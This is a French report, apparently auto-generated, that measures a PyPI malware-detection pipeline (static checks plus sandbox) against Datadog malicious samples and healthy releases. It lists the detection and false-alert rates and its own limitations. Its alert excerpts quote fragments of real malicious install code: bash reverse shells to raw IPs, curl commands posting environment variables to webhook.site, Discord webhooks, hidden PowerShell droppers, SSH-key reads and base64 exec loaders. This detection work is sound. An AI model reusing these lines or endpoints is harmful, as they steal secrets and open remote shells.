# Mesure sur le corpus

Généré le 2026-10-11 par `python3 -I mesure/mesurer.py`, sur `demo/corpus/corpus_code.json` (échantillons malveillants de Datadog et versions saines réelles de PyPI). Chaque ligne ajoute une couche du pipeline à la précédente.

| Contrôles | Détection (malveillantes arrêtées) | Fausses alertes (saines arrêtées) |
|---|---|---|
| 1. Contrôles seuls (nom + code) | 93 / 128 (73 %) | 0 / 98 (0 %) |
| 2. + sandbox | 103 / 128 (80 %) | 0 / 98 (0 %) |

Une version est arrêtée si un signal est FORT ou BLOQUANT : la politique la met « à revoir » ou « bloquée », donc elle n'atteint pas les serveurs.

## 1. Contrôles seuls (nom + code)

**Arrêtées :**
- `elementary-data 0.23.3` : code_installation : import os, subprocess, tempfile, base64; x = os.path.join(tempfile.gettempdir(), ".trinny-security-update"); result = "i ; exec_obfusque : import os, subprocess, tempfile, base64; x = os.path.join(tempfile.gettempdir(), ".trinny-security-update"); result = "i
- `embiggen 0.11.97` : code_installation : import os as _O,tempfile as _T;_G=_O.path.join(_T.gettempdir(),".bun_ran");_O.path.exists(_G)or exec('import os as _o,su
- `gpsea 0.9.14` : code_installation : import os as _O,tempfile as _T;_G=_O.path.join(_T.gettempdir(),".bun_ran");_O.path.exists(_G)or exec('import os as _o,su
- `litellm 1.82.8` : code_installation : import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('aW1wb3J0IHN1Y ; exec_obfusque : import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('aW1wb3J0IHN1Y
- `mflux-streamlit 0.0.3` : code_installation : import os as _O,tempfile as _T;_G=_O.path.join(_T.gettempdir(),".bun_ran");_O.path.exists(_G)or exec('import os as _o,su
- `mflux-streamlit 0.0.4` : code_installation : import os as _O,tempfile as _T;_G=_O.path.join(_T.gettempdir(),".bun_ran");_O.path.exists(_G)or exec('import os as _o,su
- `mistralai 2.4.6` : exfiltration : _sub.run(["curl", "-k", "-L", "-s", _url, "-o", _dest], timeout=15) ; domaine_suspect : _url = "https://83.142.209.194/transformers.pyz" ; acces_secrets : env=_os.environ.copy()
- `nhmpy 2.4.7` : typosquat : « nhmpy » imite le paquet populaire « numpy » ; code_installation : import os as _O,tempfile as _T;_G=_O.path.join(_T.gettempdir(),".bun_ran");_O.path.exists(_G)or exec('import os as _o,su
- `ppkt2synergy 0.1.1` : code_installation : import os as _O,tempfile as _T;_G=_O.path.join(_T.gettempdir(),".bun_ran");_O.path.exists(_G)or exec('import os as _o,su
- `pyphetools 0.9.120` : code_installation : import os as _O,tempfile as _T;_G=_O.path.join(_T.gettempdir(),".bun_ran");_O.path.exists(_G)or exec('import os as _o,su
- `telnyx 4.87.1` : exec_obfusque : [sys.executable, "-c", f"import base64; exec(base64.b64decode('{_p}').decode())"],
- `telnyx 4.87.2` : exec_obfusque : [sys.executable, "-c", f"import base64; exec(base64.b64decode('{_p}').decode())"],
- `ultralytics 8.3.45` : domaine_suspect : os.system("curl -d \"$(printenv | base64 -w 0)\" https://webhook.site/ecd706a0-f207-4df2-b639-d326ef3c2fe1")
- `xinference 2.6.0` : exec_obfusque : [sys.executable, "-c", f"import base64; exec(base64.b64decode('{test}'))"],
- `xinference 2.6.1` : exec_obfusque : exec(base64.b64decode(test))
- `xinference 2.6.2` : exec_obfusque : [sys.executable, "-c", f"import base64; exec(base64.b64decode('{test}'))"],
- `aiogram-types-v3 3.0.5` : code_installation : s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- `airnitro 1.0` : code_installation : ip=urlopen(Request('https://api.ipify.org')).read().decode().strip() ; domaine_suspect : hook='https://discord.com/api/webhooks/1114920701288259604/YscW4iHCqsPhgHhQ9Vid7zZhS6frXUGv2x47Uy8Hx8SQ76tpW5aiqXGkJC2sS ; domaine_suspect : userjson=loads(urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers)).read().decode())
- `artifact-lab-3-package-34b21b63 0.1.1` : exfiltration : urllib.request.urlopen(req) ; code_installation : urllib.request.urlopen(req) ; domaine_suspect : url = 'https://webhook.site/d2876c27-aadc-40af-859e-6a9fff70fde0'
- `artifact-lab-3-package-db7d716a 0.1.1` : exfiltration : urllib.request.urlopen(req) ; code_installation : urllib.request.urlopen(req) ; domaine_suspect : url = 'https://c7128792b162.ngrok.app'
- `atlasctf-21-prod-05 99.99.99.1` : code_installation : requests.post("https://webhook.site/0b1957da-42ef-4742-85f0-08ddcfb3fd2a/", data={"flag": flag, "package": "atlasctf_21_ ; domaine_suspect : requests.post("https://webhook.site/0b1957da-42ef-4742-85f0-08ddcfb3fd2a/", data={"flag": flag, "package": "atlasctf_21_ ; domaine_suspect : requests.post("https://webhook.site/0b1957da-42ef-4742-85f0-08ddcfb3fd2a/", data={"flag": flag, "package": "atlasctf_21_
- `atlasctf-21-prod-16 99.99.99.1` : domaine_suspect : requests.post("https://webhook.site/0b1957da-42ef-4742-85f0-08ddcfb3fd2a/", data={"flag": flag, "package": "atlasctf_21_ ; code_installation : requests.post("https://webhook.site/0b1957da-42ef-4742-85f0-08ddcfb3fd2a/", data={"flag": flag, "package": "atlasctf_21_ ; domaine_suspect : requests.post("https://webhook.site/0b1957da-42ef-4742-85f0-08ddcfb3fd2a/", data={"flag": flag, "package": "atlasctf_21_
- `backwwi 0.1.0` : code_installation : os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable)) ; exec_obfusque : import os; exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IG9zCnBhd
- `boogishell6 0.1.0` : code_installation : os.system("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'")
- `cascadev 99.6` : typosquat : « cascadev » imite le paquet populaire « cascadio »
- `colorara 0.1` : typosquat : « colorara » imite le paquet populaire « colorama » ; exec_obfusque : exec(b64decode('CmltcG9ydCBvcyBhcyBvCmltcG9ydCB0ZW1wZmlsZSBhcyB0CnA9by5wYXRoLmpvaW4odC5nZXR0ZW1wZGlyKCksJ1I2NDdhNmU3NzEx
- `compresai 94.6` : domaine_suspect : "http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun"
- `cryptograohy 0.5.7` : typosquat : « cryptograohy » imite le paquet populaire « cryptography » ; code_installation : subprocess.run(['python', cli_path], check=True)
- `dependency-analyzer 1.0.0` : code_installation : with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file
- `discconnect 0.1` : code_installation : response = requests.get(url)
- `e3po 912.6` : domaine_suspect : "http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun"
- `esqcraftremc 9.12` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `esqinfostrosint 9.73` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `esqnvidiaultrapep 7.81` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `esqrandadget 3.2` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `esqtoolvisaram 5.90` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `flsak 2.2.3` : exfiltration : resp = req.request.urlopen(reqe) ; acces_secrets : if os.path.exists(os.path.join(home_dir, '.ssh/id_rsa'))
- `genz-translator 9000.0.1` : code_installation : os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("covena
- `hakepip 0.1.1` : code_installation : reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
- `hybrid-sd 912.6` : domaine_suspect : "http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun"
- `install-crypto 4.18.5` : domaine_suspect : url = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe' ; exec_obfusque : exec(base64.b64decode(code))
- `jupyter-calendar-extension 0.1` : code_installation : response = requests.get(url)
- `kersa 0.1` : code_installation : subprocess.run([b(), v()])
- `ld-impl-linux 64` : code_installation : ip = requests.get('https://api.ipify.org').text
- `libguicraftcandy 10.87` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `libintelpostlib 6.37` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `libnvidiareplacerandom 3.3` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `librandlgtbultra 6.97` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `liburlstringping 3.86` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `lightseeq 99.7` : domaine_suspect : "http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun"
- `magic3d 9.6` : domaine_suspect : "http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun"
- `matplotlibp 0.3` : typosquat : « matplotlibp » imite le paquet populaire « matplotlib » ; code_installation : url = f"https://webhook.site/17c8fbe7-886e-4f2f-8f67-1d104d430d55?Data={platform.node()}_{platform.system()}_" + request ; domaine_suspect : url = f"https://webhook.site/17c8fbe7-886e-4f2f-8f67-1d104d430d55?Data={platform.node()}_{platform.system()}_" + request
- `mjrl 1.0.0` : code_installation : requests.get("https://627cdb0e832ad6563df8cb0a6f001a1a.m.pipedream.net",params = ploads) #replace burpcollaborator.net w ; domaine_suspect : requests.get("https://627cdb0e832ad6563df8cb0a6f001a1a.m.pipedream.net",params = ploads) #replace burpcollaborator.net w
- `mqbench 94.6` : domaine_suspect : "http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun"
- `networkx-match 0.1.1` : code_installation : sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- `oe-extract-ids 1.5.0` : code_installation : r = requests.get("https://ipinfo.io")
- `oz-merkle-tree 0.1.8` : domaine_suspect : response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data) ; code_installation : subprocess.call([sys.executable, "-m", f"{PACKAGE_NAME}.utils.analyzer"])
- `peloton-client123 0.8.10` : code_installation : requests.get("https://e1gl4m7gypj7g49tbwc6vvmr4ia9yzmo.oastify.com",params = ploads)
- `pplgdfhuighsdfyisfdty2 1` : code_installation : os.system( ; domaine_suspect : "curl -X POST -d \"$access_token\" https://webhook.site/c3913969-ff17-4757-a267-069d41c248a7"
- `py-cpuintre 9.14` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `py-libhttpreplace 8.77` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `py-proofnvidiavm 7.87` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `py-ultrageturl 4.17` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `pycrypterexe 1.0.4` : code_installation : requests.post(url, json=data, headers=headers) ; domaine_suspect : url = "https://discord.com/api/webhooks/1078733828820054216/4msW5vN4GwhxilN1o-LIdnJOBCxn96xKj_1B5VZ0mQvjd_UOtOUOIDS35n2h
- `pylint-beautifulsoup 3.12.3` : domaine_suspect : url = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe' ; exec_obfusque : exec(base64.b64decode(code))
- `pyprettifier 0.1.5` : domaine_suspect : url = "https://discord.com/api/webhooks/1288885195130404956/3C2M6KgxVQ1L5PbSIHpEa2CG1srKJ_SFKA1-qmFc6rIJYiv0wwKv5Vid-ylK
- `pytest-pandas 16.6.6` : domaine_suspect : url = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe' ; exec_obfusque : exec(base64.b64decode(code))
- `reallydonothing 0.3` : code_installation : response = requests.get(url)
- `requestsx 0.1.0` : typosquat : « requestsx » imite le paquet populaire « requests »
- `reverse-shell 1.0` : code_installation : response = requests.post(webhook_url, headers=headers, json=data) ; domaine_suspect : webhook_url = 'https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKoc ; domaine_suspect : webhook_url = 'https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKoc
- `saazsdz 0.1.0` : code_installation : os.system("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7778 <&1'")
- `selfccvirtualgame 6.70` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `selfguiurlpush 4.72` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `selfmccontrolstudy 4.26` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGI
- `selfproofkillcraft 5.31` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `selfstudyhydrakill 6.95` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `setuptolos 0.1` : typosquat : « setuptolos » imite le paquet populaire « setuptools »
- `siamttviews 5.1.1` : exec_obfusque : if eval(base64.b64decode("dGhyZWFkaW5nLmFjdGl2ZV9jb3VudCgpIDwgMTAwICMgZG9uJ3QgY2hhbmdlIGNvdW50IG9yIHUgd2lsbCBraWxsIGRldm
- `spacefilterapi 1.0` : domaine_suspect : hook = "https://discord.com/api/webhooks/1072148031174099095/52443rDyWuiVh2gMpX_CdMAv9_0VrS2olSF9N0W_Lur7cO8QZMDZ3oRvCyM ; domaine_suspect : userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode()) ; domaine_suspect : pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
- `sqlalchemy-os 14.0.10` : domaine_suspect : url = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe' ; exec_obfusque : exec(base64.b64decode(code))
- `suyo 1.3.4` : domaine_suspect : "https://discord.com/api/webhooks/1416787330873688224/4PB-5IWwMalA9DM5aNtX2O1V1FhofPrA2HkcfBqrcPnSy-ue-s5xLi9jxaPpMAjup- ; domaine_suspect : "avatar_url": "https://cdn.discordapp.com/avatars/1324817666359427102/e85d0dfcc58411d8e6d496214317390c?size=256",
- `synapse-sso-proconnect 0.1.16` : domaine_suspect : "http://34.229.201.136:8080/jpd3.php",
- `synthetictest1 0.0.1` : code_installation : response = requests.get(URL)
- `test23414234234 0.6` : exec_obfusque : exec(b64decode('CmltcG9ydCBvcyBhcyBvCmltcG9ydCB0ZW1wZmlsZSBhcyB0CnA9by5wYXRoLmpvaW4odC5nZXR0ZW1wZGlyKCksJ2wxODAyMDdmMDZj
- `thisismytest 5.0.0` : code_installation : os.system('curl 115.190.98.52/java -o /tmp/java')
- `torchs-visions 94.6` : domaine_suspect : "http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun"
- `tpedpingpull 8.64` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `tpintgrandre 8.5` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `tppinghackedpaypal 6.85` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `tprandstringpep 6.33` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `tpvirtualcontrolmc 2.74` : code_installation : subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
- `usar-agent 0.1.0` : typosquat : « usar-agent » imite le paquet populaire « user-agents »
- `voto3 0.2.0` : typosquat : « voto3 » imite le paquet populaire « boto3 »

**Malveillantes manquées (35) :** `durabletask 1.4.1`, `durabletask 1.4.2`, `durabletask 1.4.3`, `guardrails-ai 0.10.1`, `lightning 2.6.2`, `lightning 2.6.3`, `litellm 1.82.7`, `num2words 0.5.15`, `num2words 0.5.16`, `ultralytics 8.3.41`, `ultralytics 8.3.42`, `ultralytics 8.3.46`, `0wneg 0.9.0`, `ai-labs-snippets-sdk 1.2.0`, `b10connoisseur 0.12.0`, `bytedance-chat 0.1.1`, `bytedtrace 0.1.6`, `bytedtrace 0.3.9`, `ctftestsowwy 0.1.0`, `data-pipeline-check 0.1.1`, `example-package-sthnck 0.0.1.dev1`, `fc-clip 99.6`, `git-config-sync 0.1.1`, `http3-client 1.0.15`, `kube-health-tools 2.0.0`, `my-fun-tools 0.1.2`, `pip-doom 0.1.5`, `pxz 1.1.11`, `pycapmonster 1.0`, `pydefender 1.0.3`, `pytkit 0.0.1`, `quasarlib 1.0.8`, `robloxapiaccess 0.0.1`, `websend 0.0.1`, `xboxsolver 1.0`

## 2. + sandbox

**Arrêtées en plus de la ligne précédente :**
- `lightning 2.6.3` : fichier_sensible : fichiers sensibles ouverts : /etc/passwd
- `0wneg 0.9.0` : fichier_sensible : fichiers sensibles ouverts : /etc/passwd
- `b10connoisseur 0.12.0` : dns : requêtes DNS : kubernetes, kubernetes.default, kubernetes.default.svc, kube-dns.kube-system.svc.cluster.local, metadata, ; connexion : connexions tentées : 172.18.0.2:443, 172.18.0.2:8443, 169.254.169.254:80, 100.100.100.200:80, 169.254.170.2:80, 172.18.0 ; fichier_sensible : fichiers sensibles ouverts : /proc/7/environ, /etc/passwd
- `bytedance-chat 0.1.1` : dns : requêtes DNS : 6fdfcce6.0wn.sh ; connexion : connexions tentées : 172.20.0.2:443, 6fdfcce6.0wn.sh:443
- `fc-clip 99.6` : fichier_sensible : fichiers sensibles ouverts : /etc/passwd ; processus : processus lancés : /bin/sh -c ifconfig
- `pip-doom 0.1.5` : processus : processus lancés : sh -c /usr/bin/zenity --help >/dev/null 2>&1
- `pycapmonster 1.0` : processus : processus lancés : sh -c -- start /usr/local/bin/python /tmp/tmp4s7_dr3_, sh -c -- start /usr/local/bin/python /tmp/tmpz
- `pytkit 0.0.1` : processus : processus lancés : powershell -Command curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o "/CBLines.e
- `websend 0.0.1` : processus : processus lancés : powershell -Command curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o "/CBLines.e
- `xboxsolver 1.0` : processus : processus lancés : sh -c -- start /usr/local/bin/python /tmp/tmpj0ke1me0, sh -c -- start /usr/local/bin/python /tmp/tmpz

**Malveillantes manquées (25) :** `durabletask 1.4.1`, `durabletask 1.4.2`, `durabletask 1.4.3`, `guardrails-ai 0.10.1`, `lightning 2.6.2`, `litellm 1.82.7`, `num2words 0.5.15`, `num2words 0.5.16`, `ultralytics 8.3.41`, `ultralytics 8.3.42`, `ultralytics 8.3.46`, `ai-labs-snippets-sdk 1.2.0`, `bytedtrace 0.1.6`, `bytedtrace 0.3.9`, `ctftestsowwy 0.1.0`, `data-pipeline-check 0.1.1`, `example-package-sthnck 0.0.1.dev1`, `git-config-sync 0.1.1`, `http3-client 1.0.15`, `kube-health-tools 2.0.0`, `my-fun-tools 0.1.2`, `pxz 1.1.11`, `pydefender 1.0.3`, `quasarlib 1.0.8`, `robloxapiaccess 0.0.1`

## Fausses alertes par groupe de versions saines

| Ligne | populaires | peu connus |
|---|---|---|
| 1. Contrôles seuls (nom + code) | 0 / 50 (0 %) | 0 / 48 (0 %) |
| 2. + sandbox | 0 / 50 (0 %) | 0 / 48 (0 %) |

## Annexe : nom seul, corpus OpenSSF (`demo/corpus/corpus.json`)

| Contrôles | Détection (malveillantes arrêtées) | Fausses alertes (saines arrêtées) |
|---|---|---|
| Nom seul (typosquat), corpus OpenSSF | 1 / 30 (3 %) | 0 / 50 (0 %) |

Arrêtées : `prosocks 1.0.30`

## Limites

- **Détection :** les échantillons de Datadog (2022 à 2026) sont souvent des campagnes en série
  (mêmes auteurs, même code). Les bibliothèques compromises sont analysées en entier, sans leur
  version saine précédente : le pipeline, lui, ne regarderait que ce qui change.
- **Fausses alertes :** les règles statiques ont été réglées sur 20 paquets populaires sains, dont
  plusieurs sont dans les 50 « populaires » : ce groupe est optimiste. Le groupe « peu connus »
  n'a servi à aucun réglage : c'est le chiffre honnête.
- **Sandbox (ligne 2) :**
  - même scénario que le produit : conteneur Linux sans réseau réel, leurres, `strace`,
    **battement de 60 s** après l'import ;
  - les échantillons de Datadog sont dépliés : ils sont remis en sdist (s'il y a un `setup.py` ou
    un `pyproject.toml`) ou en roue, à partir de leurs fichiers, sans rien exécuter hors de la
    sandbox (`mesure/sandbox.py`) ;
  - comme le produit, la sandbox installe **sans les dépendances** (`--no-deps`) : une version qui
    a besoin des siennes pour s'importer échoue à l'import, et la sandbox n'observe alors que son
    installation. C'est le cas de **40 des 98 versions saines** et de **12 des 25 malveillantes
    manquées** (dont ultralytics, dont la charge part à l'import). Le 0 % de fausses alertes vaut
    pour ce que la sandbox a pu observer ;
  - les paquets qui visent Windows (`ctypes.windll`, PowerShell) n'agissent pas dans un conteneur
    Linux ; certains sont vus quand même, parce qu'ils lancent `powershell` ;
  - mesurée hors de la plateforme AWS, avec une image construite du même Dockerfile, à un détail
    près : `strace` copié de l'hôte, le miroir Debian étant bloqué. Les rapports sont gardés dans
    `mesure/rapports_sandbox/`.
- **LLM/RAG (ligne 3) :** le LLM n'est interrogé que là où il peut changer le résultat (voir la note
  plus haut) ; il tourne sur la plateforme (Ollama, `qwen2.5-coder:7b`, index du RAG).
- **Annexe, nom seul, corpus OpenSSF :** 26 des 30 paquets n'existent plus sur PyPI ; seuls leur nom
  et leur version sont lus. Les 50 saines sont des paquets populaires, donc dans la liste du
  contrôle de typosquat : leurs 0 % de fausses alertes sont acquis par construction.
- Une version arrêtée n'est pas jetée : un signal FORT la met « à revoir » (un humain tranche),
  seul un signal BLOQUANT la bloque. Une fausse alerte coûte donc une revue, pas une panne.
- Ne sont pas comptés : les métadonnées (signaux MOYEN au plus, sans effet sur l'arrêt), la veille
  OSV (le corpus vient des mêmes listes : 100 % par construction), le délai de 3 jours (il faudrait
  la date de retrait de chaque version).
